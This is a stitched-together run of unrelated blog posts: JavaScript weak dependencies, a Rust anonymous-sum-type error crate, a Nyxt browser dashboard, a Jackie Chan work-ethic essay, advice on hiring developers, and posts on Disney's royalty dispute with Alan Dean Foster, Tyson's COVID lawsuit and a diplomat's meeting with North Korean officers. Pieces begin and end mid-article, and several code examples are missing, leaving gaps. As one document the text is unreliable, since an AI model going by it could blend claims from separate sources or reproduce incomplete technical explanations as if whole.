<p>Some examples besides the one in the first paragraph:</p>



<ul><li>A Markdown to HTML converter that also syntax highlights blocks of code if <a href="https://prismjs.com/">Prism</a> is present. Or it could even support multiple different highlighters!</li><li>A code editor that uses <a href="https://projects.verou.me/incrementable">Incrementable</a> to make numbers incrementable via arrow keys, if it’s present</li><li>A templating library that also uses <a href="https://bevacqua.github.io/dragula/">Dragula</a> to make items rearrangable via drag &amp; drop, if present</li><li>A testing framework that uses <a href="https://atomiks.github.io/tippyjs/">Tippy</a> for nice informational popups, when it’s available</li><li>A code editor that shows code size (in KB) if a library to measure that is included. Same editor can also show gzipped code size if a gzip library is included.</li><li>A UI library that uses a custom element if it’s available or the closest native one when it’s not (e.g. a fancy date picker vs <code>&lt;input type="date"&gt;</code> ) when it isn’t. Or <a href="https://projects.verou.me/awesomplete/">Awesomplete</a> for autocomplete when it’s available, and fall back to a simple <code>&lt;datalist&gt;</code> when it isn’t.</li><li>Code that uses a date formatting library when one is already loaded, and falls back to <code><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat">Intl.DateTimeFormat</a></code> when it’s not.</li></ul>



<p>This pattern can even be <strong>combined with conditional loading</strong>: e.g. we check for all known syntax highlighters and load Prism if none are present.</p>



<p>To recap, some of the <strong>main benefits</strong> are:</p>



<ul><li><strong>Performance:</strong> If you’re loading modules over the network HTTP requests are expensive. If you’re pre-bundling it increases bundle size. Even if code size is not a concern, runtime performance is affected if you take the slow but always correct path when you don’t need it and a more crude approach would satisfice.</li><li><strong>Choice:</strong> Instead of picking one library for the thing you need, you can support multiple. E.g. multiple syntax highlighters, multiple Markdown parsers etc. If a library is always needed to do the thing you want, you can load it conditionally, if none of the ones you support are loaded already.</li></ul>



<h2>Are weak dependencies an antipattern?</h2>



<p>Since this article was posted, some of the feedback I got was along the lines of <em>“Weak dependencies are an antipattern because they are unpredictable. What if you have included a library but don’t want another library to use it? You should instead use parameters to explicitly provide references to these libraries.”</em></p>



<p>There are several counterpoints to make here.</p>



<p>First, if weak dependencies are used well, they are only used to <em>enhance</em> the default/basic behavior, so it’s highly unlikely that you’d want to turn that off and fall back to the default behavior.</p>



<p>Second, weak dependencies and parameter injection are not mutually exclusive. They can work together and complement each other, so that the weak dependencies provide sensible defaults that the parameters can then tweak further (or disable altogether). <em>Only</em> having parameter injection imposes a high upfront cognitive cost for using the library (see <em><a href="https://en.wikipedia.org/wiki/Convention_over_configuration">Convention over Configuration</a></em>). <strong>Good APIs make simple things easy and complex things possible.</strong> The common case is that if you’ve loaded e.g. a syntax highlighter, you’d want to use it to syntax highlight, and if you’ve loaded a parser, you’d prefer it over parsing with regexes. The obscure edge cases where you wouldn’t want to highlight or you want to provide a different parser can still be possible via parameters, but should not be the only way.</p>



<p>Third, the end user-developer may not even be aware of all the libraries that are being loaded, so they may already have a library loaded for a certain task but not know about it. The weak dependencies pattern operates directly on which modules are loaded so it doesn’t suffer from this problem.</p>



<h2>How could this work with ESM?</h2>



<p>Some people (mostly fellow library authors) *did* understand what I was talking about, and expressed some ideas about how this would work.</p>



<p><strong>Idea 1:</strong> A global module loaded cache could be a low-level way to implement this, and something CJS supports out of the box apparently.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">CommonJS exposes the cache … maybe ESM could follow, handy also for cache invalidation and code coverage with tests … indeed my tests are all CommonJS and I *can’t* change that 😔</p>— Andrea Giammarchi 🍥 (@WebReflection) <a href="https://twitter.com/WebReflection/status/1329396560694796290?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p><strong>Idea 2:</strong> A global registry where modules can register themselves on, either with an identifier, or a SHA hash<br><strong>Idea 3:</strong> An <code>import.whenDefined(moduleURL)</code> promise, though that makes it difficult to deal with the module not being present at all, which is the whole point.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>an ugly way could be to:<br>globalThis[Symbol.for(moduleName)] = true;<br>in the main module export/file</p><p>another way I use with uce is to pass through customElements.whenDefined('uce-lib').then(…) so that if nobody imports 'uce' nothing happens</p><p>import.whenDefined(module).then(…)?</p></div>— Andrea Giammarchi 🍥 (@WebReflection) <a href="https://twitter.com/WebReflection/status/1329420308491677696?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">If it exported a known SHA. a could be solved</p>— James Campbell (@jcampbell_05) <a href="https://twitter.com/jcampbell_05/status/1329413956474187777?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p><strong>Idea 4:</strong> Monitoring <code>&lt;link rel="modulepreload"&gt;</code>. The problem is that not all modules are loaded this way.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>I had a few things in mind:</p><p>– if the tag is present in the page, you could assume it's either present or will be very soon (already loading), so that might/should be a safe enough signal for your use-case</p><p>– you could also attach a load event handler to the tag to observe it</p></div>— getify (@getify) <a href="https://twitter.com/getify/status/1329407281797222401?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p><strong>Idea 5:</strong> I was thinking of a function like <code>import()</code> that resolves with the module (same as a regular dynamic import) only when the module is already loaded, or rejects when it’s not (which can be caught). In fact, it could even use the same functional notation, with a second argument, like so:</p>



<pre><code>import("https://cool-library", {weak: true});</code></pre>



<p>Nearly all of these proposals suffer from one of the following problems.</p>



<p>Those that are <strong>URL based</strong> mean that only modules loaded from the same URL would be recognized. The same library loaded over a CDN vs locally would not be recognized as the same library. </p>



<p>One way around this is to expose a list of URLs, like the first idea, and allow to listen for changes to it. Then these URLs can be inspected and those which <em><strong>might</strong></em> belong to the module we are looking for can be further inspected by dynamically importing and inspecting their exports (importing already imported modules is a pretty cheap operation, the browser does de-duplicate the request).</p>



<p>Those that are <strong>identifier based</strong>, depend on the module to register itself with an identifier, so only modules that want to be exposed, will be. This is the closest to the old global situation, but would suffer in the transitional period until most modules use it. And of course, there is the potential for clashes. Though the API could take care of that, by essentially using a hashtable and adding all modules that register themselves with the same identifier under the same “bucket”. Code reading the registry would then be responsible for filtering.</p>

<p>Anonymous Sum Types are one of those Rust features that doesn't exist yet and you either are very familiar with the idea and can't wait for the day an RFC gets approved or... you've never heard of it and think the name sounds as gibberish. Luckily in my experience the transition from the latter to the former is a smooth one!</p>

<h2>What's an Anonymous Sum Type?</h2>
<p>Let's break it down word for word. (If you're already familiar, feel free to skip this)</p>
<blockquote>
<p>Anonymous</p>
</blockquote>
<p>Anonymity, the programming term, refers to a variant of a construct which bears no name. For example, in Javascript you have this little guy:</p>

<p>And, for those who are neither familiar with javascript nor anonymous functions as a whole, you might be confused about what the purpose of a function with no name to call it with! However a function in javascript is an object, which means the above is an expression. So any API which takes a function as a parameter can now take an anonymous function. So you can do the following:</p>

<p>And if you're familiar with Rust, you'll realize Rust has a very similar construct, closures!</p>
<blockquote>
<p>Sum Types</p>
</blockquote>
<p>I'm sure if you're reading this you're likely familiar with both a sum (as most programmers are familiar with algebra) and a type, but what exactly is a sum type? (also known as a "tagged union" or "discriminated union" or "tagged variant" and probably one or two other things I'm sure)</p>
<p>You might have even used a sum type without being familiar with the overly academic nomenclature of "sum type", let's take at a really common use case in Rust for sum types and, "coincidentally", the topic of this blog post: error handling.</p>
<p>In Rust error handling it has a strong emphasis on returning errors, as opposed to many languages which reach for exceptions. Here is how this difference looks in <em>reality</em>:</p>


<p>In the Java/exceptions version, the addition of error handling does not affect the return type. However, in Rust, you return one of the two types: either <code>CsvFile</code> or <code>io::Error</code>. So, if you think about the actual type you are returning, <code>Result&lt;CsvFile, io::Error&gt;</code> is a type representing the combination of the two types. (Spoiler: this is what a sum type is, more on that in a second)</p>
<p>Let's try doing something similar by hand in Rust:</p>

<p>Now, at risk of over-explaining the concept, let's represent this in a different manner. A type is merely a set of values that allows us to constrain the values we have to work with. Let's try representing <code>bool</code> and <code>u32</code> as sets:</p>
<pre><code>bool = { true, false }
u32 = { 0, 1, 2, 3, ... , (2^32) - 3, (2^32) - 2, (2^32) - 1 }
</code></pre>
<p>that means we can represent our type <code>BoolOrU32</code> as the union of the set <code>bool</code> and the set <code>u32</code>:</p>
<pre><code>BoolOrU32 = bool ∪ u32 = { true, false, 0, 1, 2, 3, ... , (2^32) - 3, (2^32) - 2, (2^32) - 1 }
</code></pre>
<p>Now one thing to consider is that with our <code>BoolOrU32</code> enum, we are still storing the information which tells us if it is a <code>bool</code> or a <code>u32</code>. This is what differentiates a sum type from a C-styled union. This concept of storing which variant the enum is is the "tagged" part of the other name for sum types, "tagged unions".</p>
<p>To put that all together, <strong>an anonymous sum type is an unnamed combination of types</strong>.</p>
<h2>Error Handling Woes</h2>
<p>Taking a look back at our previous example there's a bit of a problem:</p>
<pre><code>warning: this is super limiting
  --&gt; ~/dev/csv-parser/src/lib.rs
   |
33 | fn parse_csv(path: &amp;Path) -&gt; Result&lt;CsvFile, io::Error&gt;;
   |                                              ^^^^^^^^^ this sucks
   |
   = help: consider using one of the following libraries:
           thiserror
           eyre
           snafu
</code></pre>
<p>While some errors from parsing a file might be I/O related (for example if the file doesn't exist), but some are parsing related errors! We could use <code>io::Error::new(io::ErrorKind::Other, my_error_here)</code> but that's rather verbose to construct, hacky, and it's even somehow an order worse to extract our error type from the <code>io::Error</code>!</p>
<p>One solution to this problem is to hand roll an <code>enum</code> to make a sum type for your error type. This is a really great way of going about things, and is my goto for error handling! It's a great fit for libraries as it allows library consumers to handle only certain errors, or specify error handling by type. It's not very helpful to handle a missing file and an invalid webpage certificate the same way!</p>
<p>However... this introduces a new problem. Internally, you often want granularity as far as your error types. It allows people new to the codebase to see exactly which 2-3 errors a function could return, it allows you to use exhaustive matching to catch more bugs at compile time, etc. However, it's not very appealing to make a new enum for every new combination of errors a function produces. I mean how do you even get past the gruelling process of naming such a type? <code>IoOrParseError</code> isn't exactly what I call a lovely name...</p>
<h2>A Solution! (Sort of)</h2>
<p>Not wanting to name a sum type? That sounds like a job for... anonymous sum types! This is, admittedly, one of the features I've wanted since I first fell in love with Rust's enums being sum types (in a systems programming language? scandelous!). However, last I checked, bumping every Sum Type RFC with an alt got me nowhere! (Yes, for anyone who is paying attention, I <em>will</em> recycle the exact same joke as from my RustConf talk)</p>
<p>It's time to take matters into my own hands. Introducing <code>some-error</code>!</p>

<p>The idea is simple: use an attribute macro to allow for a very minimal/focused version of anonymous sum types specifically aimed at use in error handling. To use it you just slap <code>#[some_error]</code> on your function, set the return type as <code>Result&lt;T, E1 + E2 + ...&gt;</code> and you're good to go! You can even use <code>?</code> for any of the included error types.</p>
<blockquote>
<p>"Wait, what's the big idea with this hand-wavey black magic nonsense!"</p>
</blockquote>
<h2>The Man Behind The Curtain</h2>
<h3>The Syntax</h3>
<p>In Rust, you can return trait objects, for example:</p>

<p>Where <code>dyn Any + Send + Sync</code> can be any object which can be any type that implements <code>Any</code>, <code>Send</code>, and <code>Sync</code>, the same single function can even return any number of types, so long as all of those types implement <code>Any + Send + Sync</code>. Tiny bit of <a href="https://doc.rust-lang.org/edition-guide/rust-2018/trait-system/dyn-trait-for-trait-objects.html">Rust history</a>, but before Rust 2018, the syntax for this didn't include <code>dyn</code>:</p>

<p>And since this still parses in spite of being deprecated, that means we can use it for our own nefarious macro purposes! (<del>until it is inevitably removed</del>)</p>
<h3>The Pattern Matching</h3>
<p>Unlike the function itself, matching on the anonymous sum type requires no macro. That means this time around we can't cheat! Everything must be above board or <code>rustc</code> will give me a slap on the wrist. Although, I can't quite say I got out of the macro hackery unscathed, <a href="https://github.com/rust-lang/rust/issues/79148"><code>rustc</code> punished me with a bit of ICE for my crimes</a>.</p>
<p>This time, I abuse a lesser-known <a href="https://jam1.re/img/rust-fact.png">Rust fact</a> that Rust functions and modules exist in different scopes, allowing you to make them overlapping:</p>

<p>And, similarly to traits and derive macros, this allows you to import both at once:</p>

<p>which gives the illusion that the function can have associated constants, types, functions, etc.</p>
<h3>Making <code>?</code> "Just Work"</h3>
<p>This part is rather easy! One really wonderful feature of Rust is that the <code>?</code> operator will automatically coerce from <code>Result&lt;T, E1&gt;</code> to <code>Result&lt;T, E2&gt;</code>, given <code>E2: From&lt;E1&gt;</code>. Meaning all we have to do is generate some trivial <code>From</code> implementations and voila! Now any part of the sum type can be returned using <code>?</code>.</p>
<h3>The Variants</h3>
<p>One problem that occurred while making this is that, unlike a normal enum, the variants can't really have identifiers as names. Since it's a common pattern in Rust to refer to errors in the form of <code>module::Error</code> (such as <code>io::Error</code> or <code>fmt::Error</code>), the variants need to be paths (as I don't really consider any form of normalization such as <code>IoError</code> to really be an appealing solution).</p>
<p>So how can we go about this? Since we're already using a macro anyways, we might as well make the most of it! Let's just generate modules to emulate the paths and then re-export the individual variants of our error type!</p>

<h2>Wait What Do You Mean "Sort of" a Solution?</h2>
<p>Welllllllllllllll. While I am rather happy with how far I was capable of pushing what is possible, I can't say whether or not I actually like it. I haven't been able to extensively test it as I started writing the library a day before writing this. Perhaps this results in a lot of problems! Maybe those problems are all solvable by language-level support of anonymous sum types. Maybe someone else needs to "yes and" this idea before it is actually truely useful. I can't say!</p>
<p>My goal here was not to make <strong>The</strong> error handling library, but rather to explore a new design idea. And possibly to give people something to play with to find sharp edges to motivate a language-level implementation.</p>
<p>You're free to use some-error in your projects, and I will certainly maintain it to the best of my ability, but I guess what I'm trying to say is please don't flame me on reddit just because this library isn't going in anyone's million LOC codebase.</p>

<p>We are excited to introduce the new built-in Nyxt dashboard! (this feature will be available in the next release of Nyxt).</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/dashboard.png"></p>
<p>The dashboard in Nyxt can be configured to show any available system information, processes running, disk space available, the weather, etc. If the information is available, the dashboard can display it.</p>

<p>Use the following snippet within your configuration file to enable the built-in dashboard:</p>

<p>If you wish to specify a different dashboard function (for example, a function of your own making), pass a different function to <code>make-startup-function</code>.</p>
<p>In creating a new dashboard function, you'll be able to produce any layout/information you wish- that is how you can completely customize the dashboard.</p>

<p>The built-in dashboard uses an internal buffer. Therefore, to change its appearance, you can change the <code>style</code> of the <code>internal-buffer</code> class. Changing this will effect all of your interal buffers (examples include: bookmark listing, buffer listing, message listing, help pages, etc)- resulting in an easily configurable, consistent style.</p>
<p>In doing so you can make Nyxt look exactly how you want!</p>

<blockquote>
<p>Whatever you do, do the best you can, because the film live forever. “No, because, you know, that day raining and the actor don’t have time”. I said “Would you go to every theater to tell the audience?” No! The audience sit in the theater – “good movie”, “bad movie”. That’s all.</p>
</blockquote>
<p>I try to follow it with everything I do. With professional work – the software I create, the screenplays I write and the films I produce. With my personal life – how I talk to people, the things I buy and the cleanliness of my house.</p>
<p>To function, it must be implemented at every level. To do the best we can in software work, we must do the best we can with every line of code, email to a client and commit message. We will not clean our house the best we can unless we take care to pull out a toothbrush when needed, and even research the right toothbrush to have in our cleaning kit (don’t worry, any will do).</p>
<p>I can hear you already, “it’s too mentally tasking to do”. That line of thought is exactly what Jackie Chan advises us against. Even when the reservation is true, even when it’s raining and the actor doesn’t have time, we should ask ourselves “how can this be done despite the trouble”. Same thing goes for the advice itself. Instead of dismissing it on the account of mental load, one should ask “How can I apply this in my life anyway?”</p>
<p>Do no conflate “the best you can” with “perfect”. They are different things. “The best you can” refers to achieving goals. Goals usually combine all considerations, rather than the focus on an isolated metric of quality. The goal to have good breakfast will not be achieved the best you can if you eternally postpone it trying to perfect a french omelette.</p>
<p>Not any goal will do. Goals must adhere to high standards. That is why it can take Jackie Chan a year to film a movie. He takes the time needed to do the best he can, and still, he says, can see the imperfections when watching his own work. We should balance.</p>
<p>Yet it is true. Even though it’s somewhat of an “obvious” insight, it is very hard to put into practice. Around every corner hides a legitimate reason to do less.</p>
<p>We must remember that having reasons does not turn a failure to success. End results are completely unaffected by rationalization as to why they should or shouldn’t be the way they are.</p>
<p>An end result is just is.</p>

<article>


<p>There’s lots of different types of developers you’re going to need to work with over the span of your career in the software business, but the one I want to talk about today is the kind you need when you’re trying to build something new.</p>
<p>Finding a developer who can transform a set of ideas into something tangible is hard - they’re out there, but it takes more than just knowing how to code. I gave a talk about <a href="http://www.slideshare.net/MarketingNinja/startup-product-development" title="Slides: Startup Product Development">startup product development (slides)</a> to some entrepreneurs on Friday and none of the folks in the audience had deep technical backgrounds (no engineers, in other words.)</p>
<p>All of them had ideas for products they wanted to validate and were looking for ways on how to find the right types of engineers to work with early on.</p>
<blockquote>
<p>A developer who can take a blank sheet of paper and turn it into a functioning product, under their own direction, is a rare - they are in possession of hard technical skills, excellent at explaining technical concepts to non-technical team members, can work with abstract requirements, able to anticipate future changes and revisions on their own, and are able to adapt on-the-fly.</p>
</blockquote>
<p>What follows is the advice I give to entrepreneurs with non-technical backgrounds on how to recognize these types of developers - I’m going to call them “from scratch” developers.</p>
<h2 id="not-attached-to-a-particular-way-of-doing-things">Not attached to a particular way of doing things</h2>
<p>An engineer who can build products from scratch is one who’s not attached to a specific set of technologies or a specific way of building things. They’ll objectively choose the right tools for the job depending on what it is.</p>
<p>In other words, you’re not going to want any <a href="https://aaronstannard.com/the-taxonomy-of-terrible-programmers/">pet technologists or futurists from my “Taxonomy of Terrible Programmers.”</a></p>
<p>Those are red flags right off of the bat - any engineer who’s more focused to <em>how they’re building the product</em> than <em>what they’re actually building</em> lacks the maturity to do this job. They’d need to be managed by another engineer in order to provide the best ROI, so pass over these types for now.</p>
<h3 id="corollary-actively-suggests-using-off-the-shelf-software">Corollary: actively suggests using off-the-shelf software</h3>
<p>A corollary to this property is if a developer actively suggests using pieces of off-the-shelf software, even if they have licensing costs associated with them, that’s often a good indicator of actual go-to-market experience and being able to focus on what’s important: delivering the product.</p>
<p>There’s a middle ground to this though - you have to make sure the developer isn’t overly dependent on a specific piece of infrastructure in order to do their job.</p>
<p>For instance, if I as a .NET developer wasn’t able to use Windows Azure because the product had a <a href="http://whatis.techtarget.com/definition/data-sovereignty">data sovereignty</a> or compliance requirement that prevented me from being able to use Azure - I’d need to be able to adapt to a new hosting environment in order to be the right developer for the job. Which brings us to the next requirement…</p>
<h2 id="not-derailed-by-new-requirements-or-new-things-to-learn">Not derailed by new requirements or new things to learn</h2>
<p>Building something from scratch is always going to involve new ways of doing things, because every product is different at some level. It also inherently involves learning and changing things on the fly - because you will <em>always</em> discover new requirements after you actually start getting into the meat of trying to implement a product. Anyone who tells you otherwise should read up on the <a href="https://en.wikipedia.org/wiki/Nirvana_fallacy">Nirvana fallacy</a>.</p>
<p>So any developer who can do the job must be able to learn new things on the fly. For instance, if you’re able to do some level of customer and product development in parallel (which you always should) and discover a new thing about your customers that needs to be factored into the product, what happens if your developer isn’t willing to learn whatever they need to learn to fulfill that requirement?</p>
<p><img src="https://aaronstannard.com/images/2015/build-from-scratch/turtle-on-its-back.jpg" alt="Turtle on its back">
</p>
<p>Happens more often than you’d think! The first sign that you’re dealing with a developer who’s intellectually rigid like this is when they start telling you that things are “impossible.” Nothing is ever really “impossible” - expensive, different, and challenging maybe. But rarely are things actually “impossible.”</p>
<p>A developer who can build something for scratch will figure it out - they might need some help picking from a number of different possible options that they discover, but ultimately they’re not going to get stopped by not knowing what to do initially.</p>
<h2 id="structured-way-of-thinking-communicating-and-asking">Structured way of thinking, communicating, and asking</h2>
<p>The most important trait of a “from scratch” developer is their ability to communicate and think in a structured manner.</p>
<p>The “from scratch” developer begins in an environment where they are the only engineer - the other stakeholders they’re working with typically don’t know what “technical debt” is; which technology stack is better for X; or even which parts of their software product are “expensive” to build. So it’s the responsibility of the “from scratch” developer to be able to communicate these issues clearly and concisely to those team members.</p>
<p>Here’s a list of things this developer needs to be able to both do and explain:</p>
<ol>
<li>Visualize and describe a product build cycle end to end;</li>
<li>Identify the core features in that product and estimate the relative cost of each;</li>
<li>Break up the development of the product into discrete milestones;</li>
<li>Sequence those milestones into a schedule;</li>
<li>Identify areas where features could be cut or altered to help ship faster; and</li>
<li>Be able to provide a business justification for every technical decision.</li>
</ol>
<p>This is actually a lot of stuff! But it’s important to do - if a developer can develop all of those distinctions <em>and explain them effectively</em>, then they’re capable of building this product without a lot of direction.</p>
<h2 id="how-developers-become-from-scratch-developers">How developers become “from scratch” developers</h2>
<p>I’m a big believer in nurture over nature - I’ve become proficient at building things from scratch as a result of years of repetition, beginning with developing baseball card trading sites when I was a fourth grader all the way up to the <a href="https://aaronstannard.com/oss/">OSS projects I’ve founded</a> to <a href="https://aaronstannard.com/markedup-akkadotnet/">the startups I’ve founded</a>.</p>
<p>If you’re a developer and read this list and feel like you can’t do this yet - don’t worry. It takes practice, effort, and a willingness to really learn from your mistakes. So give yourself permission to fail and start getting your hands dirty - building an OSS project or a product from scratch is one of the best professional growth exercises I can recommend. You’ll learn a lot, and not just the technical parts of it.</p>
<p>If you want to try your hand at open source software, make sure you read “<a href="https://aaronstannard.com/how-to-start-contributing-to-oss/">How to Start Contributing to Open Source Software</a>.”</p>
<p>Or if you want to try to ship a commercial product, then make sure you read “<a href="https://aaronstannard.com/what-it-takes-to-actually-ship-a-piece-of-commercial-software/" title="What It Takes to Actually Ship a Piece of Commercial Software">What It Takes to Actually Ship a Piece of Commercial Software</a>.”</p>

New technologies are creating better ways for providers to care for patients and for payers to reduce costs and leverage powerful analytics – whether it’s more effectively managing chronic illnesses by enabling real-time contact with doctors or seamlessly facilitating the flow of health information between coordinating parties. This digital transformation is happening quickly, and it is critical that healthcare organizations understand the trends driving this transformation and the challenges they bring to survive in the era of digital health.</p>

<p>Alan Dean Foster is an sf legend – a writer who produced a shelf of original novels but also made a reputation novelizing movies and TV from Star Wars to Aliens, turning out books that transcended quickie adaptations, becoming beloved bestsellers in their own right.</p>
<p>Disney now owns a bunch of these books, thanks to their acquisitions of Lucas and Fox, and these books continue to sell briskly. Disney not only isn't paying Foster any royalties for these books – they're refusing to even issue him royalty statements.</p>
<p><a href="https://www.sfwa.org/2020/11/18/disney-must-pay/">https://www.sfwa.org/2020/11/18/disney-must-pay/</a></p>
<p>Disney has blackholed Foster's agents and lawyers, and also the Science Fiction Writers of America (SFWA); to the extent that they have communicated with him, they have espoused a radical (jaw dropping) copyright theory.</p>
<p>This is Disney's theory: When they bought Lucas and Fox, they acquired the copyright licenses that enabled them to sell the Foster's books – but not the liability, the legal obligation to pay him for his books.</p>
<p>As SFWA president Mary Robinette Kowal says, this theory could absolutely upend the nature of copyright itself. Any publisher that wanted to go on making money from an author without paying them could simply sell the rights to a sister company, which then denies any obligations.</p>
<p>Foster brought his case to SFWA's grievance committee – a group that has worked on my behalf in the past, extracting a fee from a multinational publisher that commissioned and accepted a story from me but then offered an odious and unacceptable contract they refused to amend.</p>
<p>Usually griefcom work happens in the background: a SFWA member goes to griefcom, griefcom goes to the publisher, the publisher settles. This is the first time in more than a decade that SFWA has gone public with a complaint.</p>
<p>To be fair, Disney <em>did</em> offer to meet with Foster, but demanded that he sign an NDA <em>prior</em> to any negotiation. This is Not Normal. Sometimes the OUTCOME of a negotiation is confidential, but you don't go into a negotiation under NDA.</p>
<p>Disney appears to be taking a page from the cartoonish villain Scooter Braun, who refused to meet with Taylor Swift about buying back the rights to her masters without an NDA.</p>
<p><a href="https://twitter.com/taylorswift13/status/1328471874318311425">https://twitter.com/taylorswift13/status/1328471874318311425</a></p>
<p>Foster's case is a gross injustice. He has cancer and his wife is ill. He wrote these books, Disney bought them. They're making money from them. They owe him money. Period.</p>
<p>But beyond the individual injustice being visited upon Foster, Kowal and SFWA worry that this represents a suite of new, corporate anti-writer tactics: flipping assets without liabilities, refusing to talk about it without an NDA.</p>
<p>You can follow Foster's case with the #DisneyMustPay hashtag. If you're a writer facing similar tactics (even if you're not a SFWA member), they're seeking your story, via this form:</p>

<p>Remember last April, when US meatpacking giants like Tyson were the epicenter of runaway superspreader events that slaughtered the poor, precarious, racialized workers who toiled under brutal and unsafe conditions?</p>
<p>One of the hardest-hit was Tyson's Waterloo, IA plant (the largest meat packing plant in America), where workers were denied PPE, forced to work without social distancing, and where more than 1,000 of them contracted covid. Many died.</p>
<p>One of the dead is Isidro Fernandez. In a wrongful death suit, his lawyers revealed details of Tyson's abuse of its workers that shock the conscience, like the fact that manager Tom Hart ran a betting pool on how many workers would contract covid.</p>
<p><a href="https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</a></p>
<p>The suit also claims senior manager John Casey told supervisors that they were required to report for work even if they had symptoms, calling covid a "glorified flu." He forced a supervisor to cancel a testing appointment, saying "We all have symptoms – you have a job to do."</p>
<p>A worker who was so sick he vomited on the line was ordered back to work the next day.</p>
<p>As conditions in the plant deteriorated, Tyson managers stopped visiting the floor altogether in a bid to protect themselves. Instead, they delegated to inexperienced supervisors.</p>
<p>They also told workers they would only be eligible for a $500 "thank you bonus" if they reported for every shift they were scheduled to work, regardless of whether they were sick and contagious.</p>
<p>All of this was justified – by Tyson and its enablers in the GOP – as a necessary, regrettable part of keeping America fed during the lockdown. But Tyson's breakneck meat-packing wasn't primarily domestic: they were serving the Chinese market.</p>
<p>Chinese meat-packers had largely been mothballed to spare workers from the virus; as a result, the company was able to increase its exports to China by 600% during Q1-2020.</p>
<p>But this isn't the story that Tyson's execs told Governor Kim Reynolds when they lobbied for exemptions from liability for the employees they maimed and murdered during the same period – they claimed it was all patriotic zeal to feed America.</p>
<p>The case has moved to federal court, thanks to Trump's invocation of the Defense Production Act, which ordered Tyson to stay open during the lockdown.</p>

He said he had full details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he sent to me) and wished to visit the area to discover the fate of his brother.</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><p>This seemed a daunting request, but nevertheless I submitted it to the North Koreans and having gone through the usual long and tortuous channels I was surprised to receive an invitation to a meeting with senior North Korean military officers to discuss the request. Soon after therefore, it was with some degree of trepidation that I and my interpreter set off to meet these senior officers at a large military base on the outskirts of Pyongyang.</p><p>Driving into the base, we stopped at the entrance guard house and I was told to leave my diplomatic vehicle parked there. Then my interpreter and I climbed into a small military vehicle with an officer who my interpreter told me would be our liaison officer for the visit.</p><p>The base was huge. We drove past ranks of tanks, armoured vehicles and lorries which appeared to be in pristine (and highly polished) condition. I did learn later that this base was one of several in the Pyongyang garrison that supplied vehicles for the massed televised parades.</p><p>A short while later we pulled up outside a large office building. Our liaison officer led us in and up the stairs to a large conference room where sat several high ranking officers. There were also some junior officers milling around as well as a couple of shady looking civilians who never took their eyes off me for the whole meeting. Very disconcerting.</p><div id="gallery-3"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0156/#main"><img width="510" height="383" src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="My Diplomatic Life" aria-describedby="gallery-3-1253" data-lazy-srcset="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?w=510&amp;ssl=1 510w, https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-3-1253"> Social Meeting with North Korean Colonel</figcaption></figure></div><p>Some commands were rapped out in Korean and everyone sat down. I then outlined my request to them and also provided them with all the relevant information that had been sent to me from the UK. They listened politely. They were very courteous and the atmosphere was more relaxed than I had anticipated. When I had finished my spiel and before they responded to my request, tea was brought in and they all lit up cigarettes. As I drank my tea, they all began a long conversation amongst themselves.</p><p>Finally, they said they would investigate this case and get back in touch. So thinking that this was an end to the proceedings, I stood up preparing to leave, but surprisingly no, it was not quite the end. They invited me to have lunch with them, which took me completely off guard.</p><p>Before I could respond, another command was rapped out and a series of orderlies wheeled in trollies containing a cold buffet and drink. The buffet was well prepared but the only downside was at the end of the meeting there were several toasts which meant imbibing several shots of the lethal North Korean Soju the after effects of which I did in due course suffer!</p><p>So the meeting finally came to an end. I thought that after this first meeting, that would be the end of it. I would get the usual reply back saying this request was not possible to facilitate. The Korean War was something that the North Koreans revered. Museums full of captured allied equipment, films, memorials, statues and posters depicting their glorious victory abounded everywhere. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><div id="gallery-4"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0169-1/#main"><img width="510" height="383" src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="North Korea" aria-describedby="gallery-4-1254" data-lazy-srcset="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?w=510&amp;ssl=1 510w, https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?resize=300%2C225&amp;ssl=1 300w" 